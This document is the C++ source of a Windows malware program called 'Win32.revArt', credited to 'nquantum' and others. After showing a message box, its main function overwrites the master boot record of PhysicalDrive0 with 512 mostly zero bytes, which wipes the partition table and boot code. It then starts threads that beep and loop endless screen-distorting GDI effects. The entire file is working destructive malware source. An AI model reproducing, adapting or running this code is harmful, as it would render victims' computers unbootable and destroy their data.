

//;		Win32.revArt '
//;	made by nquantum '
//; copyright	2021     '
//;
//; do not redistribute.




#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <filesystem>
#include <thread>


#define BitBlyat BitBlt
#define DLLEXPORT __declspec(dllexport)
#define HBRUH HBRUSH
DWORD state;

HWND upWnd = GetForegroundWindow();
HDC upHdc = GetDC(upWnd);
HDC scr = GetDC(NULL);
int xs = GetSystemMetrics(SM_CXSCREEN);
int ys = GetSystemMetrics(SM_CYSCREEN);
int xm = GetSystemMetrics(SM_CXFULLSCREEN);
int runtime = 0;

HDC hWind;
HDC hDsk;
HWND xWnd;
RECT wRect;
int dX = 0, dY = 0, dW, dH;
POINT wPt[3];




DWORD xorshift;

VOID SeedXorshift32(DWORD dwSeed) {
	xorshift = dwSeed;
}

DWORD Xorshift32() {
	xorshift ^= xorshift << 13;
	xorshift ^= xorshift >> 17;
	xorshift ^= xorshift << 5;
	return xorshift;
}

const unsigned char mbrBytes[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x83, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

void xword()
{
	HDC hDC = GetDC(NULL);
	upWnd = GetForegroundWindow();
	upHdc = GetDC(upWnd);
	scr = GetDC(NULL);
	HWND hWnd = GetForegroundWindow();

	BitBlyat(scr, 1, 7, xs, xs, GetDC(NULL), 4, 7, SRCINVERT);
	Sleep(6000);
	ReleaseDC(hWnd, NULL);
}

DLLEXPORT DWORD rng() {
	state ^= state >> 7;
	HDC dc = GetDC(NULL);
	state ^= (DWORD)dc * 11;
	ReleaseDC(NULL, dc);
	return state;
}


void overwriteMbr() {
    DWORD written;

    HANDLE physicalDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    WriteFile(physicalDrive, mbrBytes, 512, &written, NULL);
    CloseHandle(physicalDrive);
}


int Zormelt()
{

#pragma region  defs


	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HDC hScreen;
	RECT scRect;
	GetWindowRect(GetDesktopWindow(), &scRect);
	DWORD dwCTR = 0;
	DWORD dwSmegma = 0;
	RECT RectangleR;

	DWORD dwRannum = rng();
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC scr = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);

	

#pragma endregion

	Sleep(30000);
	RedrawWindow(upWnd, 0, 0, 133);
	while (true)
	{
		HDC hDC = GetDC(NULL);
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		scr = GetDC(NULL);
		hScreen = GetDC(NULL);


		StretchBlt(hScreen, scRect.left + 50 + (dwRannum % 400) / 2, scRect.top + 50 + (dwRannum % 400) / 2, scRect.right - 100 - (dwRannum % 400), scRect.bottom - 100 - (dwRannum % 400), hScreen, scRect.left, scRect.top, scRect.right, scRect.bottom, 0x333333);
		Sleep(10);
	}

	return 0;
}

int Vormelt() {

#pragma region defs1


	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HDC hScreen;
	RECT scRect;
	GetWindowRect(GetDesktopWindow(), &scRect);
	DWORD dwCTR = 0;
	DWORD dwSmegma = 0;
	RECT RectangleR;

	DWORD dwRannum = rng();
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC scr = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);



#pragma endregion

	Sleep(8000);

	while (true)
	{
		HDC hDC = GetDC(NULL);
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		scr = GetDC(NULL);
		hScreen = GetDC(NULL);


		BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, NOTSRCERASE);
		Sleep(100);
	}

	return 0;
}
int Stretch()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HDC hScreen;
	RECT scRect;
	GetWindowRect(GetDesktopWindow(), &scRect);
	DWORD dwCTR = 0;
	DWORD dwSmegma = 0;
	 

	Sleep(120000);

	DWORD dwRannum = rng();
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC scr = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);

	

#pragma endregion

	while (true)
	{
		HDC hDC = GetDC(NULL);
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		scr = GetDC(NULL);
		hScreen = GetDC(NULL);

		int randCol = rand() % (1 - 254);
		int randCol1 = rand() % (1 - 254);
		int randCol2 = rand() % (1 - 254);

		xWnd = GetForegroundWindow();
		hWind = GetWindowDC(xWnd);
		hDsk = GetDC(0);
		GetWindowRect(xWnd, &wRect);

		dW = GetSystemMetrics(SM_CXSCREEN);
		dH = GetSystemMetrics(SM_CYSCREEN);


		wPt[0].x = wRect.left - 10;
		wPt[0].y = wRect.top - 10;
		wPt[1].x = wRect.right + 10;
		wPt[1].y = wRect.top;
		wPt[2].x = wRect.left - 10;
		wPt[2].y = wRect.bottom + 10;

		PlgBlt(hDsk, wPt, hDsk, wRect.left, wRect.top, wRect.right, wRect.bottom, 0, 0, 0);

		
		Sleep(10);
	}

	return 0;
}

int Cormelt()
{
#pragma region defs2


	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HDC hScreen;
	RECT scRect;
	GetWindowRect(GetDesktopWindow(), &scRect);
	DWORD dwCTR = 0;
	DWORD dwSmegma = 0;
	

	DWORD dwRannum = rng();
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC scr = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);



#pragma endregion

	while (true)
	{
		HDC hDC = GetDC(NULL);
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		scr = GetDC(NULL);
		hScreen = GetDC(NULL);

		int randCol = rand() % (1 - 254);
		int randCol1 = rand() % (1 - 254);
		int randCol2 = rand() % (1 - 254);

		HBRUH hBruh = CreateSolidBrush(RGB(randCol, randCol1, randCol2));

		SelectObject(scr, hBruh);
		PatBlt(scr, 0, 0, xs, ys, PATINVERT);

		BitBlt(scr, 0, 0, xs, ys, GetDC(HWND_DESKTOP), 0, 0, SRCCOPY);
		ReleaseDC(upWnd, scr);
		ReleaseDC(HWND_DESKTOP, GetDC(HWND_DESKTOP));

		HDC Window = GetDC(upWnd);
		int X = (rand() % xs) - (150 / 2),
			Y = (rand() % 15),
			Width = (rand() % 150);
		BitBlt(Window, X, Y, Width, ys, Window, X, 0, SRCCOPY);

		SelectObject(scr, hBruh);
		PatBlt(scr, 0, 0, xs, ys, PATINVERT);
		Sleep(100);
	}

	return 0;
}

int Hormelt()
{
#pragma region defs3



	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HDC hScreen;
	RECT scRect;
	GetWindowRect(GetDesktopWindow(), &scRect);
	DWORD dwCTR = 0;
	DWORD dwSmegma = 0;
	RECT RectangleR;

	DWORD dwRannum = rng();
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC scr = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);



#pragma endregion


	Sleep(40000);

	HDC hDC = GetDC(NULL);
	upWnd = GetForegroundWindow();
	upHdc = GetDC(upWnd);
	scr = GetDC(NULL);
	hScreen = GetDC(NULL);

	int randCol = rand() % (1 - 254);
	int randCol1 = rand() % (1 - 254);
	int randCol2 = rand() % (1 - 254);



	while (true)
	{



		HWND hWnd = GetForegroundWindow();

		int X = (rand() % xs) - (950 / 2),
			Y = (rand() % 900),
			Width = (rand() % 350);

		int randWhereX = rand() % (0 - 1920);
		int randWhereY = rand() % (0 - 1080);
		int randHow = rand() % (0 - 1080);


		HBRUH hBruh = CreateSolidBrush(RGB(randCol, randCol1, randCol2));

		SelectObject(scr, hBruh);


		PatBlt(scr, randWhereX, randWhereY, X, Y, PATINVERT);
		Sleep(5);



	}

	return 0;
}


int Formelt()
{
#pragma region defs3



	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HDC hScreen;
	RECT scRect;
	GetWindowRect(GetDesktopWindow(), &scRect);
	DWORD dwCTR = 0;
	DWORD dwSmegma = 0;
	RECT RectangleR;

	DWORD dwRannum = rng();
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC scr = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);
	int min = -1000;
	int max = 1100;
	int randNum = rand() % (max - min + 1) + min;
	int randNum2 = rand() % (299 - 423 + 1) + min;
	int randNum1 = rand() % (max - min + 1) + min;
	int randNum3 = rand() % (max - min + 1) + min;
	int randNum4 = rand() % (1080 - 1920 + 1) + min;



#pragma endregion


	Sleep(60000);





	while (true)
	{
		HDC hDC = GetDC(NULL);
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		scr = GetDC(NULL);
		hScreen = GetDC(NULL);

		int randCol = rand() % (1 - 254);
		int randCol1 = rand() % (1 - 254);
		int randCol2 = rand() % (1 - 254);


		HWND hWnd = GetForegroundWindow();

		int X = (rand() % xs) - (950 / 2),
			Y = (rand() % 900),
			Width = (rand() % 350);

		int randWhereX = rand() % (0 - 1920);
		int randWhereY = rand() % (0 - 1080);
		int randHow = rand() % (0 - 1080);


		// A color part
		PatBlt(scr, randNum, randNum3, randNum4, randNum4, 0x00F293B);

		// some funky thingy
		StretchBlt(scr, 1, 2, xs, xs, GetDC(NULL), 10, 10, 10, 10, SRCINVERT);

		// Blyats the screen "ghosting"					(INT) +}{
		BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, NOTSRCERASE);

		// funky part
		//BitBlt(hScreen, scRect.left + 5, scRect.top + 5, scRect.right + 5, scRect.bottom + 5, hScreen, scRect.left, scRect.top, SRCPAINT);
		//StretchBlt(hScreen, scRect.left, scRect.top, scRect.right / 3, scRect.bottom / 3, hScreen, scRect.left, scRect.top, scRect.right / 2, scRect.bottom / 2, SRCCOPY);
		//StretchBlt(hScreen, (scRect.right / 3) * 2, (scRect.bottom / 3) * 2, scRect.right, scRect.bottom, hScreen, scRect.right / 2, scRect.bottom / 2, scRect.right, scRect.bottom, SRCCOPY);



		// Making screen "tunneling"
		StretchBlt(hScreen, scRect.left + 50 + (dwRannum % 400) / 2, scRect.top + 50 + (dwRannum % 400) / 2, scRect.right - 100 - (dwRannum % 400), scRect.bottom - 100 - (dwRannum % 400), hScreen, scRect.left, scRect.top, scRect.right, scRect.bottom, 0x333333);

		// Inverts some thingy and makes that more funky
		BitBlyat(scr, 1, 7, xs, xs, GetDC(NULL), 4, 7, SRCINVERT);

		ReleaseDC(NULL, hScreen);
		ReleaseDC(upWnd, hScreen);
		Sleep(5);



	}

	return 0;
}




VOID beep() {
	SeedXorshift32(20000);
	Beep(Xorshift32(), 5000);
}

void HandleMSGBOX()
{
	HWND hWnd = GetForegroundWindow();
	MessageBoxA(hWnd, "Win32.revArt | made by nquantum, intException, gabrik and more. | Have fun! :d", "Win32.revArt", MB_ICONINFORMATION | MB_OK);
}



VOID OverwriteMbr() {
	DWORD written;

	HANDLE physicalDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	WriteFile(physicalDrive, mbrBytes, 512, &written, NULL);
	CloseHandle(physicalDrive);
}

int main()

{
	int min = -1000;
	int max = 1100;

	int randNum = rand() % (max - min + 1) + min;
	int randNum2 = rand() % (299 - 423 + 1) + min;
	int randNum1 = rand() % (max - min + 1) + min;
	int randNum3 = rand() % (max - min + 1) + min;
	int randNum4 = rand() % (1080 - 1920 + 1) + min;

	int randCol = rand() % (1 - 254 + 1) + min;
	int randCol1 = rand() % (1 - 254 + 1) + min;
	int randCol2 = rand() % (1 - 254 + 1) + min;


	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HandleMSGBOX();
	Sleep(700);


	HDC hScreen;
	RECT scRect;
	GetWindowRect(GetDesktopWindow(), &scRect);
	DWORD dwCTR = 0;
	DWORD dwSmegma = 0;
	RECT RectangleR;

	DWORD dwRannum = rng();
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC scr = GetDC(NULL);
	int xs = GetSystemMetrics(SM_CXSCREEN);
	int ys = GetSystemMetrics(SM_CYSCREEN);


	HDC hDC = GetDC(NULL);
	upWnd = GetForegroundWindow();
	upHdc = GetDC(upWnd);
	scr = GetDC(NULL);
	hScreen = GetDC(NULL);


	INPUT input;

	/*

	BitBlyat(scr, 10, 10, xs, xs, GetDC(NULL), 10, 10, NOTSRCCOPY);
	BitBlyat(scr, 10, 10, xs, xs, GetDC(NULL), 10, 10, NOTSRCCOPY);

	Sleep(1200);

	BitBlyat(scr, 10, 10, xs, xs, GetDC(NULL), 10, 10, NOTSRCCOPY);
	BitBlyat(scr, 10, 10, xs, xs, GetDC(NULL), 10, 10, NOTSRCCOPY);

	Sleep(2000);


		BitBlyat(scr, 10, 10, xs, xs, GetDC(NULL), 10, 10, NOTSRCCOPY);


	Sleep(3000);
	BitBlyat(scr, 10, 10, xs, xs, GetDC(NULL), 10, 10, NOTSRCCOPY);

	*/


	
	overwriteMbr();


	std::thread thread7(beep);

	std::thread thrd1(Vormelt);
	std::thread thrd2(Zormelt);
	std::thread thrd3(Cormelt);
	std::thread thrd4(Hormelt);
	std::thread thrd5(Formelt);
	std::thread thrd6(Stretch);
	


	// old payload
	while (true)
	{

		//BitBlyat(desktop, -10, -10, xs, ys, GetDC(NULL), 10, 10, SRCCOPY);





		/*

		HWND hWnd = GetForegroundWindow();

		int X = (rand() % xs) - (950 / 2),
			Y = (rand() % 900),
			Width = (rand() % 350);

		int randWhereX = rand() % (0 - 1920);
		int randWhereY = rand() % (0 - 1080);
		int randHow = rand() % (0 - 1080);


		HBRUH hBruh = CreateSolidBrush(RGB(randCol, randCol1, randCol2));

		SelectObject(scr, hBruh);

		PatBlt(scr, randWhereX, randWhereY, X, Y, PATINVERT);

		*/



		// PatBlt(scr, randWhereX, randWhereY, Y, X, PATINVERT);

		/*

		BitBlt(scr, 0, 0, xs, ys, GetDC(HWND_DESKTOP), 0, 0, NOTSRCCOPY);
		ReleaseDC(hWnd, scr);
		ReleaseDC(HWND_DESKTOP, GetDC(HWND_DESKTOP));

		HDC Window = GetDC(hWnd);
		int X = (rand() % xs) - (350 / 2),
			Y = (rand() % 15),
			Width = (rand() % 350);
		BitBlt(Window, X, Y, Width, ys, Window, X, 0, NOTSRCCOPY);

		*/


		// BitBlyat(scr, 10, 10, xs, xs, GetDC(NULL), 1, 11, SRCINVERT);

		// A color part
		 //PatBlt(scr, randNum, randNum3, randNum4, randNum4, 0x00F293B);

		// some funky thingy
		//StretchBlt(scr, 1, 7, xs, xs, GetDC(NULL), 10, 10, 10, 10, SRCINVERT);

		// Blyats the screen "ghosting"					(INT) +}{
		// BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, NOTSRCERASE);

		// funky part
		//BitBlt(hScreen, scRect.left + 5, scRect.top + 5, scRect.right + 5, scRect.bottom + 5, hScreen, scRect.left, scRect.top, SRCPAINT);
		//StretchBlt(hScreen, scRect.left, scRect.top, scRect.right / 3, scRect.bottom / 3, hScreen, scRect.left, scRect.top, scRect.right / 2, scRect.bottom / 2, SRCCOPY);
		//StretchBlt(hScreen, (scRect.right / 3) * 2, (scRect.bottom / 3) * 2, scRect.right, scRect.bottom, hScreen, scRect.right / 2, scRect.bottom / 2, scRect.right, scRect.bottom, SRCCOPY);



		// Making screen "tunneling"
	   // StretchBlt(hScreen, scRect.left + 50 + (dwRannum % 400) / 2, scRect.top + 50 + (dwRannum % 400) / 2, scRect.right - 100 - (dwRannum % 400), scRect.bottom - 100 - (dwRannum % 400), hScreen, scRect.left, scRect.top, scRect.right, scRect.bottom, 0x333333);

		// Inverts some thingy and makes that more funky
		//BitBlyat(scr, 1, 7, xs, xs, GetDC(NULL), 4, 7, SRCINVERT);

		ReleaseDC(NULL, hScreen);
		ReleaseDC(upWnd, hScreen);
		Sleep(5);


		// BitBlt(scr, 10, 10, xs = rand() % 9 - 4, ys = rand() % 9 - 4, GetDC(NULL), 10, 10, SRCCOPY);

		// BitBlt(scr, -10, -10, xs, ys, GetDC(NULL), 10, 10, 0x999999);


	}


}


